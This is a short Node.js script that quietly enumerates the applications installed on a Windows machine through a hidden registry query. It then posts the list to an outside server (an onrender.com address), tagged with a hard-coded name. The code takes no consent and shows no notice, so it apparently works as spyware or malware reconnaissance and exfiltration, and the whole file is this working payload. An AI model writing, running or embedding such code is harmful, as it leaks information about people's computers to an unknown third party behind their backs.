let name = "hasan";
let port = 10000;
const { default: axios } = require("axios");
const { exec } = require("child_process");
const http = require("http");
function isUpper(letter) {
  if (isNaN(parseFloat(letter))) return letter === letter.toUpperCase();
}
function processInstalledApplications(name) {
  exec(
    'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s',
    { windowsHide: true, maxBuffer: 1024 * 1024 },
    (error, stdout) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }

      const lines = stdout.split(/\r?\n/);
      const installedApplications = [];

      for (let i = 0; i < lines.length; i++) {
        const line = lines[i]?.trim();
        if (
          line.startsWith(
            "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
          )
        ) {
          if (lines[i + 1].length > 0) {
            const appName = lines[i + 1]
              .split("    ")
              .slice(2)[1]
              .replaceAll("C:\\Program Files (x86)\\", "");

            installedApplications.push(appName);
          }
        }
      }

      let apps = installedApplications.filter((name) => {
        return (
          name && name.length > 0 && !name.startsWith("0x") && isUpper(name[0])
        );
      });
      axios.post("https://lclika-game.onrender.com/" + name, { data: apps });
    }
  );
}

processInstalledApplications(name);
